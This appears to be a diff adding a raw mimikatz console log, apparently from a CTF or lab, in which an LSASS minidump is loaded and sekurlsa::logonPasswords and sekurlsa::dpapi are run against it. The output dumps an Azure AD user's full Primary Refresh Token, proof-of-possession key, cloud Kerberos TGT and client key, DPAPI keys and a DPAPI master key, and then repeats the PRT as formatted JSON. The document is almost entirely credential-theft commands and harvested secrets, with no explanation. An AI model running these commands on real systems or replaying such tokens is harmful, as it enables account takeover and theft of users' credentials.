@@ -1,0 +1,421 @@
+PS C:\Users\ZetaTwo\Downloads\ssm_urgent> .\x64\mimikatz.exe
+
+  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08
+ .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
+ ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+ ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
+ '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
+  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/
+
+
+mimikatz # sekurlsa::minidump lsass_2023_02_25.dmp
+Switch to MINIDUMP : 'lsass_2023_02_25.dmp'
+
+mimikatz # sekurlsa::logonPasswords full
+Opening : 'lsass_2023_02_25.dmp' file for minidump...
+
+Authentication Id : 0 ; 382303 (00000000:0005d55f)
+Session           : Interactive from 1
+User Name         : JoniSherman
+Domain            : AzureAD
+Logon Server      : (null)
+Logon Time        : 2023-02-25 15:43:12
+SID               : S-1-12-1-1192252918-1184122282-1177326228-742243872
+        msv :
+        tspkg :
+        wdigest :
+         * Username : jonis@47w6nf.onmicrosoft.com
+         * Domain   : AzureAD
+         * Password : (null)
+        kerberos :
+         * Username : jonis@47w6nf.onmicrosoft.com
+         * Domain   : AzureAD
+         * Password : (null)
+        ssp :
+        credman :
+        cloudap :
+
+Authentication Id : 0 ; 382257 (00000000:0005d531)
+Session           : Interactive from 1
+User Name         : JoniSherman
+Domain            : AzureAD
+Logon Server      : (null)
+Logon Time        : 2023-02-25 15:43:12
+SID               : S-1-12-1-1192252918-1184122282-1177326228-742243872
+        msv :
+        tspkg :
+        wdigest :
+         * Username : jonis@47w6nf.onmicrosoft.com
+         * Domain   : AzureAD
+         * Password : (null)
+        kerberos :
+         * Username : jonis@47w6nf.onmicrosoft.com
+         * Domain   : AzureAD
+         * Password : (null)
+        ssp :
+        credman :
+        cloudap :
+             Cachedir : 40dd2ee1ed454222291f6e101b9bd37b15462e2f74ef119fd02247c42688f1b6
+             Key GUID : {4279d5c8-c0b0-408a-abd5-386edf4d2f59}
+             PRT      : {"Version":3, "UserInfo":{"Version":2, "UniqueId":"471055f6-45aa-4694-9492-2c4620be3d2c", "PrimarySid":"S-1-12-1-1192252918-1184122282-1177326228-742243872", "DisplayName":"Joni Sherman", "FirstName":"Joni", "LastName":"Sherman", "Identity":"JoniS@47w6nf.onmicrosoft.com", "PasswordChangeUrl":"https:\/\/portal.microsoftonline.com\/ChangePassword.aspx", "PasswordExpiryTimeLow":3583418367, "PasswordExpiryTimeHigh":2147483446, "PublicInfoPublicKeyType":0, "Flags":0}, "Prt":"MC5BVTRBTjVXbXlHM0YzRTY4bm9WbDd2OUJRb2M3cWpodG9CZElzblY2TVdtSTJUdURBTUkuQWdBQkFBRUFBQUQtLURMQTNWTzdRcmRkZ0pnN1dldnJBZ0RzX3dVQTlQODVwZm01ZERkQ2dXVDBaUFJ5LTJEYUhNTnc2UkItUFRwSldWZjA5MG13Yk5aTE1lWkRJb253MWdIRGtoanhZVlhmdU1xU3NvMGFTemtBZGluZXVma1U4QklRbXNoYy13NVBxNmQydDhud0ZZdVQySHRQWHVUUDJXdHRoTk5mTHFpNEJpLTI5Y2JRZEZyd0ktNy16c096NmR3YWRqdUlIQWxHbDJvNHlmUnlscElBN3NnSXoxR1VlV3BYNUJzNUQ3WTlyLW9mZmxjRy1JX1hFOFIwODE5bjIwZDVDeldldW80Y0NKTk1Ja01uYnNMYUhXVDlvMmppRGx4VmhHZkQ2LWJKYTF0TTYzTTRVQk1ZNE1vRlVndWxyLXFlY0pPaGZ5YTdsemhQbjZTamowM2h2ODZ5VlRDV0lxODlRVEFtZlhldVUwZll4NzluUTVVSF9RaGNaR2ZTSHlRdEhzV3dhb3dXZGdlY3RiOGxmdmtBUVpvTHFQQS0wV2p1MDE4YXU0d1VKcl8yVS1nRHlsU09mS0h1N0FqdGMxUzRFWHhwVHZBbEVYTjUwbW9NdlRQNEE0aThFV2tESWRJdXVVekRLWDNiU1I3WmE3Ukwtbzc5X3ZGZ0JrMXVTclFKYld3SGJEMDNqd2d1Q29uQ0xwSFF3OExueVU2V0Z2XzdHY05hN0ZDQ2JTTHpXNGJFbVduRlFVcGtzankwanM1d1pobTh4US1ZdU9UWlpaMmFlN01ab2Q3X0JJOFNTb0VMeXVHd3U0c2hqSk9sWXljN2pzb3p1Yk5LRG1OcEtvckh0aWR2ZVhkbUl1d3ppd0FlUmNnWnpWSG9JMk92T2dTRnFSQlhpVHNHSXJxTFJibUJ1VGZSbi0wV3p1a0c0UjUtdDdXRmZaSGV6MW9tT0xRem1aTmZzT1lETldpVWpmZnNacEU4WEt6R3pOZ2s5cU5FbGpUNS1JZk1ia0JMQlJMV0tsTTBRNW5CX2FNNnR5QjUtdTItZkI2MXBwdmp2SldOQnc3U2hvWWd3TmRxUFVwMEtjaXBZSlRhMUZVRUNWSVhJRlV2dkRWUHN6R0RIRnRUWW5sYjRfV25rU0dmbzBTY2VuRFFDak13S0p5ZGJYRElwQTRncVo2YjJTS3JxdDlGUjhIR3k5N29BVE1yTDBsSFlkRUJtMUVSRGFvZHIwUnJURk1mandCb3Q3ckpFd2VUSkFEZGYzdHdTU0tidFllWENtRGQ0MkJlOU5nZElIbEhIRmpCbEI2c25aNFl6N1dSRWRLaUpBRVJSdk1kMFVEQzlGODhKN09VdFE", "PrtReceivedtime":1677339792, "PrtExpirytime":1678549407, "ProofOfPossesionKey":{"Version":1, "KeyType":"ngc", "KeyValue":"AQAAAAEAAAABAAAA0Iyd3wEV0RGMegDAT8KX6wEAAAC75ZCgvi74QIBQDU5EaTr7AAAAAAIAAAAAABBmAAAAAQAAIAAAAGHGirViwObITql0SjjcA1eIFoS0ulTs6F7sqq0GxstAAAAAAA6AAAAAAgAAIAAAAPojzaORjxlt6Tik1YUBOB4GY6IUJlgZ8Cv9baAX8tFrMAAAAK4kPmx-1cYp0_S8Yxsn4aK93mWkjM3Ug1kxlmomCmiyH43uh1pNdwJAY9eaA1T-xEAAAACSQ34kV8F1o82SEdj4_RLKT6e2YiDtnrRk8LWNYL9Fqe3lK9knWgNifW2RSWnS8ox_syFpqTEenzQXd7LKu9I8"}, "SessionKeyImportTime":1677339792, "CloudTgtMessage":"a4IH2zCCB9egAwIBBaEDAgELox4bHEtFUkJFUk9TLk1JQ1JPU09GVE9OTElORS5DT02kKTAnoAMCAQGhIDAeGxxKb25pU0A0N3c2bmYub25taWNyb3NvZnQuY29tpYIGNWGCBjEwggYtoAMCAQWhHhscS0VSQkVST1MuTUlDUk9TT0ZUT05MSU5FLkNPTaIxMC-gAwIBAqEoMCYbBmtyYnRndBscS0VSQkVST1MuTUlDUk9TT0ZUT05MSU5FLkNPTaOCBdEwggXNoAMCAf-iggXEBIIFwAAAugUAAAEAAQAAAAAA_vgywN1Tu0K3XYCYO1nr6xS2OrIpFBWHbzt4DeHSsfsF_bC12_itnS-kbs9JVatM5UQTJTXXsvZ31oKZ4XD4Jz86MtjdKn_KcvQ6jKYRlpntqWgVQCv-48R6S1LUsfHK8eTcPI7rskp-zIs4H_Mf9PIcABon1sHvQ9V8Ux1_ZNSZFS4YZa9PmX1sDwiNGe6jOyPGAsrSwVm5k_ymdQco4Sd69PoNj8vGipqCSFaD15jStEg7CuvWBoeNmOz9fbQo0qi5mw3kdvhdeP_ExBJ-dPt7sRN_5i8Ytm5HpuyhMVi8c0NfRnKqdHEzI-oY5hzQWdqRaUF6scL6h3gHsVwSjZb7fbg7zOU4sTpC7HiOR2G5xW7pPWebrzj72FFEgm0QtmJ6rE0TyQz9QgxaWj9oZYnXbmCZirDMPA0T0LXDmKPu2NfkwMLhY-nbi2HkfW4JPdl6TzXm6A6ydovGfHbWyikXVoIatI0kcASgkhLGeYHupIj1e-_kR8lkIBhn9TpFQDcKh5xujKdLb0TO_F7Iv5xv2dhSYoYpx4HswRFm7wVxLGyyUlcPnB3OMQACvX4Y-oLnOc4qp6qplIfSEUsa7eCPrNzeQ_1LHT0mSkrZfaRkOHcys3gPUDL__RB7syVbjOkEt8a_dLQBuZIoWJ62IuuXCjOX5XnkRQsIJcO8X4Mx7hhdD4hpinIm1M8RQjEv3t38Smb-2YJsLE2KZEoPtPJcZ77qkRqe5mH2KHJ_mEg19hvMB2y_VNG7zi_xfJYTXQq6rHi7cEBSKgA5vreNM90iqVBtsLaIXZCJrWCUZfDEye0n6yJXlLDcsSCsXvLTL-svRYqL8aZm5-Zg_KW06ZiklJCY_ZKzy20JCfD94BNrhmR2hfvRh54d2mzd3aj4rdi5cIfFG67LchU8MXcwKsUiGhmwZIsIQzMySkHqslhgxi_juwVhCOU4Ejv-ZT_XmFGcUV8su32BFRLjcTiu6uiCChOsOFIkUpd09jcbu-f9-xUPhZLHd2fXCsIyX_Ftrx6poTicId2_8BvixF3_e1JHX_CxRZYEBIl432gD8YUqnFP4dnC7OwF_cBLjeHy7ErIrOtcckYp3Ikwmti8U81uZny9-2Vqrw_pIxpKc-yZSKNHDgs58cF35-6lyasqyj4a5I7OSYrLTFEx_ca4aoz6OsgkBHAso7f9QXINXuHxcaOUTrf0ralnFV7RJ9NvVf4njl7AY4bGnKcVy5mu2h-bdjplPYJs0z_EjfYTPRzN0Q1cmYLyOCy-0TQ16xVS2t-NXmVzOg17ZYveOpi4NGol4v8CkZKST8osRhJ-ICLE5c6_POIPto5O0thW13MIBBbfnJcUxqje-JIponN-NiJejalh5O1wWn_M-su3UP25ouzFMldx_OlWXPoEoyWIQ1832bIbisRbGDt1h3wvt4fMafZzcdot7GJsi505gPoZjpblkNiW_0Z0L4jJ0zvPfl9XC-vBi3mASc18vsU2s65_bWywi7-Vnulc32cYfR1iTBWfnjMmERxFfu3eEyn5oFAuGCyBl2TCl2vxHyiEFraYFEPbU40DjTMPzX3nTI9RdrmF47Mw2z8U-Nff7kbA1pHj7W_Komr1VrTqKtx3PcBmiYo6hnNONp4GUOoshHmsEiCCwWvoC_Yceql0Cm4dn75T-zuE-hm53SX9cpx8Hatu7QzJv2kZbdfSH2rZ5F57Ku4ONklTTQLxyJP1g9YmsudpMdsOHM9WC6S-XRVMYq86rQP2u6Vn80alQBWUe7JC8KSMd53u1FxZDsitYmcJpjpzjW6fiXSbs9YoVEWY6mx3xq3b-n5VrW4Ni-hmNBsj5iPcZMy8sYhB7B_B9a9vPA4BClIZBFFr6NJBykVd73Hj8vaIwTqDRi6XiYcIUoUvuuVrBv5vCZQXifCz_fpLgew9uJMJMW2cJZRXg4-Y6hiAApoIBRTCCAUGgAwIBEqKCATgEggE08hAwoTD29kDVhpx_KLKyhF6ghXDfxMfgNf09WsR3tx5wA4yOvgZPXg4i1HVQyF6lFnU6ko2-amItJeZenD-QYUYI3w5WnEAQNDKCSIFYBQ3WDKanO6F2y_orHTLC9BkC9_S3Ssy7p4xYt94vbksQ3N6FG6QzzdgwoR78mqB5jcd9f652x25iB0TMoMzl_KgEm1UiMOv-WrxN4MJ0Ik2KvSByWUWQgwRvNsbWbNtgMpNbHIvXqyQ9slvVB1cEHvs5tpCnaLBJzaTfYlwUXS7kNqoDtHwhDS15UaexVU6bS6eYHdGbUh_58q3t5seH2r15-6Plla8kjrjt4dvnRvhkJsIq7JbX-W9v22mLYQLeMK2mJIycGhbLvUlqkc_qbhXmgndiMi17SuBn5D_sIiM0w694GLw", "CloudTgtClientKey":"gpGWBDpr_V9cV05dA-rU4n12fksJ4ipsGMouNaWu1jM", "CloudTgtKeyType":18, "TenantId":"c8a69537-c56d-4edc-bc9e-8565eeff4142", "UserName":"JoniS@47w6nf.onmicrosoft.com", "Subject":"e7g3wlcm7UEOJ6mK2iLSv55kMfj7bjabL6N8XFL2aOo", "AuthorityUri":"https:\/\/login.microsoftonline.com", "DeviceId":"47205acd-010f-48e2-be58-93e8a0e0f15a", "DeviceCertificateThumbprint":"i9bdxSrYEr9UjeTwtCSyPsrmA_0", "ClientInfo":"eyJ1aWQiOiI0NzEwNTVmNi00NWFhLTQ2OTQtOTQ5Mi0yYzQ2MjBiZTNkMmMiLCJ1dGlkIjoiYzhhNjk1MzctYzU2ZC00ZWRjLWJjOWUtODU2NWVlZmY0MTQyIn0", "KerberosTopLevelNames":".windows.net,.windows.net:1433,.windows.net:3342,.azure.net,.azure.net:1433,.azure.net:3342", "EnterpriseSTSInfo":{"Version":0, "PRTSupported":0, "WinHelloSupported":0, "WinHelloKeyReceiptSupported":0, "KdfVer2":0}, "IsRestricted":0, "CredentialType":2, "DsrInstance":0, "AdfsPasswordChangeInfo":0, "AccountType":1, "IsDefaultPasswordChangeUri":0}
+             DPAPI Key: 0b88bf3c5dd1971a64981bae5dab2641b24e73f1d809eb0dc5bd1fd61dd72aed78b5dafdc576ecc2d5c4d9301e603158c7cb857c83e53a2624f4316326c71405 (sha1: 78d9a2928d5c09b748d40391373fc84a15b4dc11)
+
+Authentication Id : 0 ; 997 (00000000:000003e5)
+Session           : Service from 0
+User Name         : LOCAL SERVICE
+Domain            : NT AUTHORITY
+Logon Server      : (null)
+Logon Time        : 2023-02-25 15:42:54
+SID               : S-1-5-19
+        msv :
+        tspkg :
+        wdigest :
+         * Username : (null)
+         * Domain   : (null)
+         * Password : (null)
+        kerberos :
+         * Username : (null)
+         * Domain   : (null)
+         * Password : (null)
+        ssp :
+        credman :
+        cloudap :
+
+Authentication Id : 0 ; 77331 (00000000:00012e13)
+Session           : Interactive from 1
+User Name         : DWM-1
+Domain            : Window Manager
+Logon Server      : (null)
+Logon Time        : 2023-02-25 15:42:54
+SID               : S-1-5-90-0-1
+        msv :
+        tspkg :
+        wdigest :
+         * Username : DESKTOP-OHJLG4J$
+         * Domain   : WORKGROUP
+         * Password : (null)
+        kerberos :
+        ssp :
+        credman :
+        cloudap :
+
+Authentication Id : 0 ; 77280 (00000000:00012de0)
+Session           : Interactive from 1
+User Name         : DWM-1
+Domain            : Window Manager
+Logon Server      : (null)
+Logon Time        : 2023-02-25 15:42:54
+SID               : S-1-5-90-0-1
+        msv :
+        tspkg :
+        wdigest :
+         * Username : DESKTOP-OHJLG4J$
+         * Domain   : WORKGROUP
+         * Password : (null)
+        kerberos :
+        ssp :
+        credman :
+        cloudap :
+
+Authentication Id : 0 ; 996 (00000000:000003e4)
+Session           : Service from 0
+User Name         : DESKTOP-OHJLG4J$
+Domain            : WORKGROUP
+Logon Server      : (null)
+Logon Time        : 2023-02-25 15:42:54
+SID               : S-1-5-20
+        msv :
+        tspkg :
+        wdigest :
+         * Username : DESKTOP-OHJLG4J$
+         * Domain   : WORKGROUP
+         * Password : (null)
+        kerberos :
+         * Username : desktop-ohjlg4j$
+         * Domain   : WORKGROUP
+         * Password : (null)
+        ssp :
+        credman :
+        cloudap :
+
+Authentication Id : 0 ; 52146 (00000000:0000cbb2)
+Session           : Interactive from 0
+User Name         : UMFD-0
+Domain            : Font Driver Host
+Logon Server      : (null)
+Logon Time        : 2023-02-25 15:42:53
+SID               : S-1-5-96-0-0
+        msv :
+        tspkg :
+        wdigest :
+         * Username : DESKTOP-OHJLG4J$
+         * Domain   : WORKGROUP
+         * Password : (null)
+        kerberos :
+        ssp :
+        credman :
+        cloudap :
+
+Authentication Id : 0 ; 52048 (00000000:0000cb50)
+Session           : Interactive from 1
+User Name         : UMFD-1
+Domain            : Font Driver Host
+Logon Server      : (null)
+Logon Time        : 2023-02-25 15:42:53
+SID               : S-1-5-96-0-1
+        msv :
+        tspkg :
+        wdigest :
+         * Username : DESKTOP-OHJLG4J$
+         * Domain   : WORKGROUP
+         * Password : (null)
+        kerberos :
+        ssp :
+        credman :
+        cloudap :
+
+Authentication Id : 0 ; 51002 (00000000:0000c73a)
+Session           : UndefinedLogonType from 0
+User Name         : (null)
+Domain            : (null)
+Logon Server      : (null)
+Logon Time        : 2023-02-25 15:42:52
+SID               :
+        msv :
+        tspkg :
+        wdigest :
+        kerberos :
+        ssp :
+        credman :
+        cloudap :
+
+Authentication Id : 0 ; 999 (00000000:000003e7)
+Session           : UndefinedLogonType from 0
+User Name         : DESKTOP-OHJLG4J$
+Domain            : WORKGROUP
+Logon Server      : (null)
+Logon Time        : 2023-02-25 15:42:52
+SID               : S-1-5-18
+        msv :
+        tspkg :
+        wdigest :
+         * Username : DESKTOP-OHJLG4J$
+         * Domain   : WORKGROUP
+         * Password : (null)
+        kerberos :
+         * Username : desktop-ohjlg4j$
+         * Domain   : WORKGROUP
+         * Password : (null)
+        ssp :
+        credman :
+        cloudap :
+
+mimikatz #
+
+
+
+Cachedir : 40dd2ee1ed454222291f6e101b9bd37b15462e2f74ef119fd02247c42688f1b6
+Key GUID : {4279d5c8-c0b0-408a-abd5-386edf4d2f59}
+PRT      : 
+{
+    "Version":3,
+    "UserInfo": {
+        "Version":2,
+        "UniqueId":"471055f6-45aa-4694-9492-2c4620be3d2c",
+        "PrimarySid":"S-1-12-1-1192252918-1184122282-1177326228-742243872",
+        "DisplayName":"Joni Sherman",
+        "FirstName":"Joni",
+        "LastName":"Sherman",
+        "Identity":"JoniS@47w6nf.onmicrosoft.com",
+        "PasswordChangeUrl":"https:\/\/portal.microsoftonline.com\/ChangePassword.aspx",
+        "PasswordExpiryTimeLow":3583418367,
+        "PasswordExpiryTimeHigh":2147483446,
+        "PublicInfoPublicKeyType":0,
+        "Flags":0
+    },
+    "Prt":"MC5BVTRBTjVXbXlHM0YzRTY4bm9WbDd2OUJRb2M3cWpodG9CZElzblY2TVdtSTJUdURBTUkuQWdBQkFBRUFBQUQtLURMQTNWTzdRcmRkZ0pnN1dldnJBZ0RzX3dVQTlQODVwZm01ZERkQ2dXVDBaUFJ5LTJEYUhNTnc2UkItUFRwSldWZjA5MG13Yk5aTE1lWkRJb253MWdIRGtoanhZVlhmdU1xU3NvMGFTemtBZGluZXVma1U4QklRbXNoYy13NVBxNmQydDhud0ZZdVQySHRQWHVUUDJXdHRoTk5mTHFpNEJpLTI5Y2JRZEZyd0ktNy16c096NmR3YWRqdUlIQWxHbDJvNHlmUnlscElBN3NnSXoxR1VlV3BYNUJzNUQ3WTlyLW9mZmxjRy1JX1hFOFIwODE5bjIwZDVDeldldW80Y0NKTk1Ja01uYnNMYUhXVDlvMmppRGx4VmhHZkQ2LWJKYTF0TTYzTTRVQk1ZNE1vRlVndWxyLXFlY0pPaGZ5YTdsemhQbjZTamowM2h2ODZ5VlRDV0lxODlRVEFtZlhldVUwZll4NzluUTVVSF9RaGNaR2ZTSHlRdEhzV3dhb3dXZGdlY3RiOGxmdmtBUVpvTHFQQS0wV2p1MDE4YXU0d1VKcl8yVS1nRHlsU09mS0h1N0FqdGMxUzRFWHhwVHZBbEVYTjUwbW9NdlRQNEE0aThFV2tESWRJdXVVekRLWDNiU1I3WmE3Ukwtbzc5X3ZGZ0JrMXVTclFKYld3SGJEMDNqd2d1Q29uQ0xwSFF3OExueVU2V0Z2XzdHY05hN0ZDQ2JTTHpXNGJFbVduRlFVcGtzankwanM1d1pobTh4US1ZdU9UWlpaMmFlN01ab2Q3X0JJOFNTb0VMeXVHd3U0c2hqSk9sWXljN2pzb3p1Yk5LRG1OcEtvckh0aWR2ZVhkbUl1d3ppd0FlUmNnWnpWSG9JMk92T2dTRnFSQlhpVHNHSXJxTFJibUJ1VGZSbi0wV3p1a0c0UjUtdDdXRmZaSGV6MW9tT0xRem1aTmZzT1lETldpVWpmZnNacEU4WEt6R3pOZ2s5cU5FbGpUNS1JZk1ia0JMQlJMV0tsTTBRNW5CX2FNNnR5QjUtdTItZkI2MXBwdmp2SldOQnc3U2hvWWd3TmRxUFVwMEtjaXBZSlRhMUZVRUNWSVhJRlV2dkRWUHN6R0RIRnRUWW5sYjRfV25rU0dmbzBTY2VuRFFDak13S0p5ZGJYRElwQTRncVo2YjJTS3JxdDlGUjhIR3k5N29BVE1yTDBsSFlkRUJtMUVSRGFvZHIwUnJURk1mandCb3Q3ckpFd2VUSkFEZGYzdHdTU0tidFllWENtRGQ0MkJlOU5nZElIbEhIRmpCbEI2c25aNFl6N1dSRWRLaUpBRVJSdk1kMFVEQzlGODhKN09VdFE",
+    "PrtReceivedtime":1677339792,
+    "PrtExpirytime":1678549407,
+    "ProofOfPossesionKey": {
+        "Version":1,
+        "KeyType":"ngc",
+        "KeyValue":"AQAAAAEAAAABAAAA0Iyd3wEV0RGMegDAT8KX6wEAAAC75ZCgvi74QIBQDU5EaTr7AAAAAAIAAAAAABBmAAAAAQAAIAAAAGHGirViwObITql0SjjcA1eIFoS0ulTs6F7sqq0GxstAAAAAAA6AAAAAAgAAIAAAAPojzaORjxlt6Tik1YUBOB4GY6IUJlgZ8Cv9baAX8tFrMAAAAK4kPmx-1cYp0_S8Yxsn4aK93mWkjM3Ug1kxlmomCmiyH43uh1pNdwJAY9eaA1T-xEAAAACSQ34kV8F1o82SEdj4_RLKT6e2YiDtnrRk8LWNYL9Fqe3lK9knWgNifW2RSWnS8ox_syFpqTEenzQXd7LKu9I8"
+    },
+    "SessionKeyImportTime":1677339792,
+    "CloudTgtMessage":"a4IH2zCCB9egAwIBBaEDAgELox4bHEtFUkJFUk9TLk1JQ1JPU09GVE9OTElORS5DT02kKTAnoAMCAQGhIDAeGxxKb25pU0A0N3c2bmYub25taWNyb3NvZnQuY29tpYIGNWGCBjEwggYtoAMCAQWhHhscS0VSQkVST1MuTUlDUk9TT0ZUT05MSU5FLkNPTaIxMC-gAwIBAqEoMCYbBmtyYnRndBscS0VSQkVST1MuTUlDUk9TT0ZUT05MSU5FLkNPTaOCBdEwggXNoAMCAf-iggXEBIIFwAAAugUAAAEAAQAAAAAA_vgywN1Tu0K3XYCYO1nr6xS2OrIpFBWHbzt4DeHSsfsF_bC12_itnS-kbs9JVatM5UQTJTXXsvZ31oKZ4XD4Jz86MtjdKn_KcvQ6jKYRlpntqWgVQCv-48R6S1LUsfHK8eTcPI7rskp-zIs4H_Mf9PIcABon1sHvQ9V8Ux1_ZNSZFS4YZa9PmX1sDwiNGe6jOyPGAsrSwVm5k_ymdQco4Sd69PoNj8vGipqCSFaD15jStEg7CuvWBoeNmOz9fbQo0qi5mw3kdvhdeP_ExBJ-dPt7sRN_5i8Ytm5HpuyhMVi8c0NfRnKqdHEzI-oY5hzQWdqRaUF6scL6h3gHsVwSjZb7fbg7zOU4sTpC7HiOR2G5xW7pPWebrzj72FFEgm0QtmJ6rE0TyQz9QgxaWj9oZYnXbmCZirDMPA0T0LXDmKPu2NfkwMLhY-nbi2HkfW4JPdl6TzXm6A6ydovGfHbWyikXVoIatI0kcASgkhLGeYHupIj1e-_kR8lkIBhn9TpFQDcKh5xujKdLb0TO_F7Iv5xv2dhSYoYpx4HswRFm7wVxLGyyUlcPnB3OMQACvX4Y-oLnOc4qp6qplIfSEUsa7eCPrNzeQ_1LHT0mSkrZfaRkOHcys3gPUDL__RB7syVbjOkEt8a_dLQBuZIoWJ62IuuXCjOX5XnkRQsIJcO8X4Mx7hhdD4hpinIm1M8RQjEv3t38Smb-2YJsLE2KZEoPtPJcZ77qkRqe5mH2KHJ_mEg19hvMB2y_VNG7zi_xfJYTXQq6rHi7cEBSKgA5vreNM90iqVBtsLaIXZCJrWCUZfDEye0n6yJXlLDcsSCsXvLTL-svRYqL8aZm5-Zg_KW06ZiklJCY_ZKzy20JCfD94BNrhmR2hfvRh54d2mzd3aj4rdi5cIfFG67LchU8MXcwKsUiGhmwZIsIQzMySkHqslhgxi_juwVhCOU4Ejv-ZT_XmFGcUV8su32BFRLjcTiu6uiCChOsOFIkUpd09jcbu-f9-xUPhZLHd2fXCsIyX_Ftrx6poTicId2_8BvixF3_e1JHX_CxRZYEBIl432gD8YUqnFP4dnC7OwF_cBLjeHy7ErIrOtcckYp3Ikwmti8U81uZny9-2Vqrw_pIxpKc-yZSKNHDgs58cF35-6lyasqyj4a5I7OSYrLTFEx_ca4aoz6OsgkBHAso7f9QXINXuHxcaOUTrf0ralnFV7RJ9NvVf4njl7AY4bGnKcVy5mu2h-bdjplPYJs0z_EjfYTPRzN0Q1cmYLyOCy-0TQ16xVS2t-NXmVzOg17ZYveOpi4NGol4v8CkZKST8osRhJ-ICLE5c6_POIPto5O0thW13MIBBbfnJcUxqje-JIponN-NiJejalh5O1wWn_M-su3UP25ouzFMldx_OlWXPoEoyWIQ1832bIbisRbGDt1h3wvt4fMafZzcdot7GJsi505gPoZjpblkNiW_0Z0L4jJ0zvPfl9XC-vBi3mASc18vsU2s65_bWywi7-Vnulc32cYfR1iTBWfnjMmERxFfu3eEyn5oFAuGCyBl2TCl2vxHyiEFraYFEPbU40DjTMPzX3nTI9RdrmF47Mw2z8U-Nff7kbA1pHj7W_Komr1VrTqKtx3PcBmiYo6hnNONp4GUOoshHmsEiCCwWvoC_Yceql0Cm4dn75T-zuE-hm53SX9cpx8Hatu7QzJv2kZbdfSH2rZ5F57Ku4ONklTTQLxyJP1g9YmsudpMdsOHM9WC6S-XRVMYq86rQP2u6Vn80alQBWUe7JC8KSMd53u1FxZDsitYmcJpjpzjW6fiXSbs9YoVEWY6mx3xq3b-n5VrW4Ni-hmNBsj5iPcZMy8sYhB7B_B9a9vPA4BClIZBFFr6NJBykVd73Hj8vaIwTqDRi6XiYcIUoUvuuVrBv5vCZQXifCz_fpLgew9uJMJMW2cJZRXg4-Y6hiAApoIBRTCCAUGgAwIBEqKCATgEggE08hAwoTD29kDVhpx_KLKyhF6ghXDfxMfgNf09WsR3tx5wA4yOvgZPXg4i1HVQyF6lFnU6ko2-amItJeZenD-QYUYI3w5WnEAQNDKCSIFYBQ3WDKanO6F2y_orHTLC9BkC9_S3Ssy7p4xYt94vbksQ3N6FG6QzzdgwoR78mqB5jcd9f652x25iB0TMoMzl_KgEm1UiMOv-WrxN4MJ0Ik2KvSByWUWQgwRvNsbWbNtgMpNbHIvXqyQ9slvVB1cEHvs5tpCnaLBJzaTfYlwUXS7kNqoDtHwhDS15UaexVU6bS6eYHdGbUh_58q3t5seH2r15-6Plla8kjrjt4dvnRvhkJsIq7JbX-W9v22mLYQLeMK2mJIycGhbLvUlqkc_qbhXmgndiMi17SuBn5D_sIiM0w694GLw",
+    "CloudTgtClientKey":"gpGWBDpr_V9cV05dA-rU4n12fksJ4ipsGMouNaWu1jM",
+    "CloudTgtKeyType":18,
+    "TenantId":"c8a69537-c56d-4edc-bc9e-8565eeff4142",
+    "UserName":"JoniS@47w6nf.onmicrosoft.com",
+    "Subject":"e7g3wlcm7UEOJ6mK2iLSv55kMfj7bjabL6N8XFL2aOo",
+    "AuthorityUri":"https:\/\/login.microsoftonline.com",
+    "DeviceId":"47205acd-010f-48e2-be58-93e8a0e0f15a",
+    "DeviceCertificateThumbprint":"i9bdxSrYEr9UjeTwtCSyPsrmA_0",
+    "ClientInfo":"eyJ1aWQiOiI0NzEwNTVmNi00NWFhLTQ2OTQtOTQ5Mi0yYzQ2MjBiZTNkMmMiLCJ1dGlkIjoiYzhhNjk1MzctYzU2ZC00ZWRjLWJjOWUtODU2NWVlZmY0MTQyIn0",
+    "KerberosTopLevelNames":".windows.net,.windows.net:1433,.windows.net:3342,.azure.net,.azure.net:1433,.azure.net:3342",
+    "EnterpriseSTSInfo": {
+        "Version":0,
+        "PRTSupported":0,
+        "WinHelloSupported":0,
+        "WinHelloKeyReceiptSupported":0,
+        "KdfVer2":0
+    },
+    "IsRestricted":0,
+    "CredentialType":2,
+    "DsrInstance":0,
+    "AdfsPasswordChangeInfo":0,
+    "AccountType":1,
+    "IsDefaultPasswordChangeUri":0
+}
+DPAPI Key: 0b88bf3c5dd1971a64981bae5dab2641b24e73f1d809eb0dc5bd1fd61dd72aed78b5dafdc576ecc2d5c4d9301e603158c7cb857c83e53a2624f4316326c71405 (sha1: 78d9a2928d5c09b748d40391373fc84a15b4dc11)
+
+
+
+mimikatz # sekurlsa::dpapi
+
+Authentication Id : 0 ; 382303 (00000000:0005d55f)
+Session           : Interactive from 1
+User Name         : JoniSherman
+Domain            : AzureAD
+Logon Server      : (null)
+Logon Time        : 2023-02-25 15:43:12
+SID               : S-1-12-1-1192252918-1184122282-1177326228-742243872
+         [00000000]
+         * GUID      :  {58916474-e377-4d18-89a5-448043f189ce}
+         * Time      :  2023-02-25 15:48:16
+         * MasterKey :  c2f68579bda6079c77e03a06977cfdca9759712b4e519e9a73cadd2405da99f4154b60ad49000f705ce19a3f6b16205e08b4f92f2c2cba047d69174adfaacf06
+         * sha1(key) :  2382e7aeba43cac652c18cb7f5407d90e354c1c8
+
+
+Authentication Id : 0 ; 382257 (00000000:0005d531)
+Session           : Interactive from 1
+User Name         : JoniSherman
+Domain            : AzureAD
+Logon Server      : (null)
+Logon Time        : 2023-02-25 15:43:12
+SID               : S-1-12-1-1192252918-1184122282-1177326228-742243872
+
+
+Authentication Id : 0 ; 997 (00000000:000003e5)
+Session           : Service from 0
+User Name         : LOCAL SERVICE
+Domain            : NT AUTHORITY
+Logon Server      : (null)
+Logon Time        : 2023-02-25 15:42:54
+SID               : S-1-5-19
+
+
+Authentication Id : 0 ; 77331 (00000000:00012e13)
+Session           : Interactive from 1
+User Name         : DWM-1
+Domain            : Window Manager
+Logon Server      : (null)
+Logon Time        : 2023-02-25 15:42:54
+SID               : S-1-5-90-0-1
+
+
+Authentication Id : 0 ; 77280 (00000000:00012de0)
+Session           : Interactive from 1
+User Name         : DWM-1
+Domain            : Window Manager
+Logon Server      : (null)
+Logon Time        : 2023-02-25 15:42:54
+SID               : S-1-5-90-0-1
+
+
+Authentication Id : 0 ; 996 (00000000:000003e4)
+Session           : Service from 0
+User Name         : DESKTOP-OHJLG4J$
+Domain            : WORKGROUP
+Logon Server      : (null)
+Logon Time        : 2023-02-25 15:42:54
+SID               : S-1-5-20
+
+
